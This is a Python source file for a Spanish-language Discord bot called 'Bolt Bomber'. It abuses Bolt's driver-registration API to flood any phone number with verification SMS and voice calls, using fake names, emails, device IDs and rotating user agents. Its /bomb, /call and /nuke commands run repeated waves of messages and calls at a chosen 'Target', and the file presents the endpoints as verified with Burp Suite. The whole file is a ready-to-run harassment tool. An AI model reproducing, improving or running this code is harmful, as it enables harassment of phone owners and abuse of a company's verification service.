#!/usr/bin/env python3
"""
Discord Bomber Bot - BOLT ONLY
Solo Bolt Driver - API verificada con Burp Suite
"""

import discord
from discord.ext import commands
from discord import app_commands
import requests
import asyncio
import uuid
import os
import random
import urllib3
from concurrent.futures import ThreadPoolExecutor
urllib3.disable_warnings()

TOKEN = os.environ.get("DISCORD_TOKEN")
if not TOKEN:
    print("ERROR: Configura la variable DISCORD_TOKEN")
    exit(1)

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

executor = ThreadPoolExecutor(max_workers=20)

class BoltBomber:
    def __init__(self):
        self.results = {"sms_ok": 0, "sms_fail": 0, "call_ok": 0, "call_fail": 0}
        self.session = requests.Session()
        self.session.verify = False
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
            "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile",
        ]

    def reset(self):
        self.results = {"sms_ok": 0, "sms_fail": 0, "call_ok": 0, "call_fail": 0}

    def random_ua(self):
        return random.choice(self.user_agents)

    def gen_uuid(self):
        return str(uuid.uuid4())

    def gen_email(self):
        domains = ["gmail.com", "hotmail.com", "outlook.es", "yahoo.es", "proton.me"]
        return f"user{uuid.uuid4().hex[:8]}@{random.choice(domains)}"

    def gen_name(self):
        nombres = ["Carlos", "Maria", "Juan", "Ana", "Pedro", "Laura", "Miguel", "Carmen", "Jose", "Lucia", "David", "Elena", "Pablo", "Sofia"]
        apellidos = ["Garcia", "Martinez", "Lopez", "Sanchez", "Gonzalez", "Rodriguez", "Fernandez", "Perez", "Ruiz", "Diaz", "Moreno", "Munoz"]
        return random.choice(nombres), random.choice(apellidos)

    def bolt_driver(self, phone, channel="sms"):
        """
        Bolt Driver Registration - VERIFICADO CON BURP
        channel: "sms" o "call"
        """
        try:
            # Paso 1: Iniciar registro
            url1 = "https://driverregistration.live.boltsvc.net/driverRegistration/startRegistration"
            params = {
                "version": "HP.24.33",
                "device_name": "HP",
                "device_os_version": "web",
                "deviceId": "web",
                "deviceType": "web",
                "language": "es-es"
            }
            nombre, apellido = self.gen_name()
            data1 = {
                "email": self.gen_email(),
                "phone": phone,
                "city_id": 1617,  # Madrid
                "first_name": nombre,
                "last_name": apellido,
                "terms_consent_accepted": 1
            }

            headers = {
                "User-Agent": self.random_ua(),
                "Content-Type": "application/json",
                "Accept": "application/json"
            }

            resp1 = self.session.post(url1, params=params, json=data1, headers=headers, timeout=15)

            if resp1.status_code != 200:
                return False, f"Paso 1 fallo: {resp1.status_code}"

            resp1_json = resp1.json()
            token = resp1_json.get("data", {}).get("token")

            if not token:
                # Puede ser rate limit
                msg = resp1_json.get("message", "Sin token")
                return False, msg

            # Paso 2: Pedir verificacion
            url2 = "https://driverregistration.live.boltsvc.net/driverRegistration/startVerification?brand=bolt"
            data2 = {
                "token": token,
                "verification_code_channel": channel,  # "sms" o "call"
                "device_os_version": "web",
                "device_name": self.random_ua(),
                "deviceId": self.gen_uuid(),
                "device_type": "web",
                "version": "DR.3.90",
                "language": "es-es",
                "visitor_id": f"visitor-driver-{self.gen_uuid()}"
            }

            resp2 = self.session.post(url2, json=data2, headers=headers, timeout=15)
            resp2_json = resp2.json()

            if resp2.status_code == 200 and resp2_json.get("code") == 0:
                return True, "ENVIADO"
            else:
                msg = resp2_json.get("message", f"Code: {resp2_json.get('code')}")
                return False, msg

        except Exception as e:
            return False, str(e)

    def bolt_sms(self, phone):
        """Bolt Driver - SMS"""
        success, msg = self.bolt_driver(phone, "sms")
        if success:
            self.results["sms_ok"] += 1
        else:
            self.results["sms_fail"] += 1
        return success, msg

    def bolt_call(self, phone):
        """Bolt Driver - LLAMADA"""
        success, msg = self.bolt_driver(phone, "call")
        if success:
            self.results["call_ok"] += 1
        else:
            self.results["call_fail"] += 1
        return success, msg

    async def bomb_sms(self, phone, count=1):
        """Enviar SMS"""
        loop = asyncio.get_event_loop()
        for i in range(count):
            success, msg = await loop.run_in_executor(executor, self.bolt_sms, phone)
            yield i + 1, success, msg
            if not success and "LIMIT" in msg.upper():
                break  # Rate limited, parar
            await asyncio.sleep(0.5)  # Pequeña pausa entre intentos

    async def bomb_call(self, phone, count=1):
        """Enviar LLAMADAS"""
        loop = asyncio.get_event_loop()
        for i in range(count):
            success, msg = await loop.run_in_executor(executor, self.bolt_call, phone)
            yield i + 1, success, msg
            if not success and "LIMIT" in msg.upper():
                break
            await asyncio.sleep(0.5)

    async def bomb_all(self, phone, count=1):
        """SMS + LLAMADAS alternando"""
        loop = asyncio.get_event_loop()
        total = count * 2
        for i in range(count):
            # SMS
            success, msg = await loop.run_in_executor(executor, self.bolt_sms, phone)
            yield i * 2 + 1, "SMS", success, msg
            if not success and "LIMIT" in msg.upper():
                break
            await asyncio.sleep(0.3)

            # CALL
            success, msg = await loop.run_in_executor(executor, self.bolt_call, phone)
            yield i * 2 + 2, "CALL", success, msg
            if not success and "LIMIT" in msg.upper():
                break
            await asyncio.sleep(0.3)


bomber = BoltBomber()

@bot.event
async def on_ready():
    print(f"="*50)
    print(f"  BOLT BOMBER - CONECTADO")
    print(f"  Bot: {bot.user}")
    print(f"  Servicio: Bolt Driver (SMS + CALL)")
    print(f"  API: Verificada con Burp Suite")
    print(f"="*50)
    try:
        synced = await bot.tree.sync()
        print(f"  Comandos: {len(synced)}")
    except Exception as e:
        print(f"  Error: {e}")


@bot.tree.command(name="bomb", description="Enviar SMS con Bolt")
@app_commands.describe(phone="Numero (+34...)", count="Cantidad de SMS (1-50)")
async def bomb_cmd(interaction: discord.Interaction, phone: str, count: int = 10):
    if not phone.startswith("+"):
        phone = "+34" + phone
    count = max(1, min(count, 50))

    bomber.reset()

    await interaction.response.send_message(
        f"```ansi\n"
        f"\x1b[1;33mBOLT SMS BOMBER\x1b[0m\n"
        f"{'='*35}\n"
        f"Target: {phone}\n"
        f"Cantidad: {count}\n"
        f"Enviando...\n"
        f"```"
    )

    last_msg = ""
    async for i, success, msg in bomber.bomb_sms(phone, count):
        status = "\x1b[32mOK\x1b[0m" if success else f"\x1b[31mFAIL\x1b[0m"
        last_msg = msg
        await interaction.edit_original_response(content=
            f"```ansi\n"
            f"\x1b[1;33mBOLT SMS\x1b[0m - {phone}\n"
            f"{'='*35}\n"
            f"Progreso: {i}/{count}\n"
            f"Ultimo: {status} - {msg[:30]}\n"
            f"\x1b[32mOK: {bomber.results['sms_ok']}\x1b[0m | \x1b[31mFail: {bomber.results['sms_fail']}\x1b[0m\n"
            f"```"
        )

    await interaction.edit_original_response(content=
        f"```ansi\n"
        f"\x1b[1;32mBOLT SMS - COMPLETADO\x1b[0m\n"
        f"{'='*35}\n"
        f"Target: {phone}\n"
        f"\x1b[32mSMS ENVIADOS: {bomber.results['sms_ok']}\x1b[0m\n"
        f"Fallidos: {bomber.results['sms_fail']}\n"
        f"Ultimo msg: {last_msg[:40]}\n"
        f"```"
    )


@bot.tree.command(name="call", description="Enviar LLAMADAS con Bolt")
@app_commands.describe(phone="Numero (+34...)", count="Cantidad de llamadas (1-50)")
async def call_cmd(interaction: discord.Interaction, phone: str, count: int = 10):
    if not phone.startswith("+"):
        phone = "+34" + phone
    count = max(1, min(count, 50))

    bomber.reset()

    await interaction.response.send_message(
        f"```ansi\n"
        f"\x1b[1;35mBOLT CALL BOMBER\x1b[0m\n"
        f"{'='*35}\n"
        f"Target: {phone}\n"
        f"Cantidad: {count}\n"
        f"Llamando...\n"
        f"```"
    )

    last_msg = ""
    async for i, success, msg in bomber.bomb_call(phone, count):
        status = "\x1b[32mOK\x1b[0m" if success else f"\x1b[31mFAIL\x1b[0m"
        last_msg = msg
        await interaction.edit_original_response(content=
            f"```ansi\n"
            f"\x1b[1;35mBOLT CALL\x1b[0m - {phone}\n"
            f"{'='*35}\n"
            f"Progreso: {i}/{count}\n"
            f"Ultimo: {status} - {msg[:30]}\n"
            f"\x1b[32mOK: {bomber.results['call_ok']}\x1b[0m | \x1b[31mFail: {bomber.results['call_fail']}\x1b[0m\n"
            f"```"
        )

    await interaction.edit_original_response(content=
        f"```ansi\n"
        f"\x1b[1;32mBOLT CALL - COMPLETADO\x1b[0m\n"
        f"{'='*35}\n"
        f"Target: {phone}\n"
        f"\x1b[35mLLAMADAS OK: {bomber.results['call_ok']}\x1b[0m\n"
        f"Fallidas: {bomber.results['call_fail']}\n"
        f"Ultimo msg: {last_msg[:40]}\n"
        f"```"
    )


@bot.tree.command(name="nuke", description="SMS + LLAMADAS alternando")
@app_commands.describe(phone="Numero (+34...)", count="Rondas SMS+CALL (1-30)")
async def nuke_cmd(interaction: discord.Interaction, phone: str, count: int = 10):
    if not phone.startswith("+"):
        phone = "+34" + phone
    count = max(1, min(count, 30))

    bomber.reset()
    total = count * 2

    await interaction.response.send_message(
        f"```ansi\n"
        f"\x1b[1;31mBOLT NUKE\x1b[0m\n"
        f"{'='*35}\n"
        f"Target: {phone}\n"
        f"Rondas: {count} (SMS+CALL cada una)\n"
        f"Total: {total} ataques\n"
        f"DESTRUYENDO...\n"
        f"```"
    )

    last_msg = ""
    async for i, tipo, success, msg in bomber.bomb_all(phone, count):
        status = "\x1b[32mOK\x1b[0m" if success else f"\x1b[31mFAIL\x1b[0m"
        last_msg = msg
        await interaction.edit_original_response(content=
            f"```ansi\n"
            f"\x1b[1;31mBOLT NUKE\x1b[0m - {phone}\n"
            f"{'='*35}\n"
            f"Progreso: {i}/{total}\n"
            f"Ultimo: {tipo} {status}\n"
            f"\x1b[32mSMS: {bomber.results['sms_ok']}\x1b[0m | \x1b[35mCALL: {bomber.results['call_ok']}\x1b[0m\n"
            f"```"
        )

    total_ok = bomber.results['sms_ok'] + bomber.results['call_ok']
    await interaction.edit_original_response(content=
        f"```ansi\n"
        f"\x1b[1;32mBOLT NUKE - COMPLETADO\x1b[0m\n"
        f"{'='*35}\n"
        f"Target: {phone}\n"
        f"\x1b[32mSMS OK: {bomber.results['sms_ok']}\x1b[0m\n"
        f"\x1b[35mCALL OK: {bomber.results['call_ok']}\x1b[0m\n"
        f"\x1b[33mTOTAL: {total_ok}\x1b[0m\n"
        f"Msg: {last_msg[:35]}\n"
        f"```"
    )


@bot.tree.command(name="test", description="Probar Bolt una vez")
@app_commands.describe(phone="Numero (+34...)", tipo="sms o call")
async def test_cmd(interaction: discord.Interaction, phone: str, tipo: str = "sms"):
    if not phone.startswith("+"):
        phone = "+34" + phone

    await interaction.response.send_message(f"```\nTesteando Bolt {tipo.upper()}...\n```")

    bomber.reset()
    if tipo.lower() == "call":
        success, msg = bomber.bolt_call(phone)
    else:
        success, msg = bomber.bolt_sms(phone)

    status = "\x1b[1;32mOK - ENVIADO\x1b[0m" if success else f"\x1b[1;31mFAIL - {msg}\x1b[0m"
    await interaction.edit_original_response(content=
        f"```ansi\n"
        f"TEST BOLT {tipo.upper()}\n"
        f"{'='*35}\n"
        f"Numero: {phone}\n"
        f"Resultado: {status}\n"
        f"```"
    )


@bot.tree.command(name="help", description="Ver comandos")
async def help_cmd(interaction: discord.Interaction):
    await interaction.response.send_message(
        f"```ansi\n"
        f"\x1b[1;36mBOLT BOMBER - COMANDOS\x1b[0m\n"
        f"{'='*40}\n"
        f"\x1b[33m/bomb\x1b[0m <numero> <cantidad>\n"
        f"   Enviar SMS (max 50)\n"
        f"   Ej: /bomb +34612345678 20\n"
        f"\n"
        f"\x1b[35m/call\x1b[0m <numero> <cantidad>\n"
        f"   Enviar LLAMADAS (max 50)\n"
        f"   Ej: /call +34612345678 20\n"
        f"\n"
        f"\x1b[31m/nuke\x1b[0m <numero> <rondas>\n"
        f"   SMS + CALL alternando (max 30)\n"
        f"   Ej: /nuke +34612345678 15\n"
        f"\n"
        f"\x1b[32m/test\x1b[0m <numero> <tipo>\n"
        f"   Probar una vez (sms/call)\n"
        f"   Ej: /test +34612345678 sms\n"
        f"{'='*40}\n"
        f"API: Bolt Driver (Burp verified)\n"
        f"```"
    )


# Comandos con prefijo !
@bot.command(name="bomb")
async def bomb_prefix(ctx, phone: str, count: int = 10):
    if not phone.startswith("+"): phone = "+34" + phone
    count = max(1, min(count, 50))
    bomber.reset()
    msg = await ctx.send(f"```Bolt SMS -> {phone} x{count}...```")
    async for i, success, m in bomber.bomb_sms(phone, count):
        await msg.edit(content=f"```{i}/{count} | OK: {bomber.results['sms_ok']} | {m[:25]}```")
    await msg.edit(content=f"```COMPLETADO - SMS: {bomber.results['sms_ok']}/{count}```")

@bot.command(name="call")
async def call_prefix(ctx, phone: str, count: int = 10):
    if not phone.startswith("+"): phone = "+34" + phone
    count = max(1, min(count, 50))
    bomber.reset()
    msg = await ctx.send(f"```Bolt CALL -> {phone} x{count}...```")
    async for i, success, m in bomber.bomb_call(phone, count):
        await msg.edit(content=f"```{i}/{count} | OK: {bomber.results['call_ok']} | {m[:25]}```")
    await msg.edit(content=f"```COMPLETADO - CALL: {bomber.results['call_ok']}/{count}```")

@bot.command(name="nuke")
async def nuke_prefix(ctx, phone: str, count: int = 10):
    if not phone.startswith("+"): phone = "+34" + phone
    count = max(1, min(count, 30))
    bomber.reset()
    msg = await ctx.send(f"```NUKE -> {phone}...```")
    async for i, tipo, success, m in bomber.bomb_all(phone, count):
        t = bomber.results['sms_ok'] + bomber.results['call_ok']
        await msg.edit(content=f"```{i}/{count*2} | SMS:{bomber.results['sms_ok']} CALL:{bomber.results['call_ok']}```")
    t = bomber.results['sms_ok'] + bomber.results['call_ok']
    await msg.edit(content=f"```NUKE COMPLETADO - Total: {t}```")


if __name__ == "__main__":
    print(f"\nBOLT BOMBER - Solo Bolt Driver (API verificada)")
    print(f"Comandos: /bomb, /call, /nuke, /test, /help\n")
    bot.run(TOKEN)
